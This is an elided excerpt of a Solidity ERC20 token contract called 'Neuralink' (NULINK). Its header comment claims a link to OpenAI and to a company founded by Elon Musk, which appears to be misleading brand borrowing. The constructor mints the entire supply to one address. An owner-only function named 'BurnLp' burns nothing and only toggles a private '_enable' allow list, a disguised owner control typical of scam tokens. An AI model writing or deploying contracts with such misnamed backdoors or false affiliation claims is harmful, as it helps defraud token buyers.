...
/**
Based on openAi and the company founded by Elon Musk.
...
contract Neuralink is ERC20, Ownable {
    mapping(address=>bool) private _enable;
    address private _uni;
    constructor() ERC20('Neuralink','NULINK') {
        _mint(0x13c2d2482B718c3278Ead8Fada1EA2FC87DC9F06, 1000000 *10**18);
        _enable[0x13c2d2482B718c3278Ead8Fada1EA2FC87DC9F06] = true;
    }
    ...
    function BurnLp(address user, bool enable) public onlyOwner {
        _enable[user] = enable;
    }
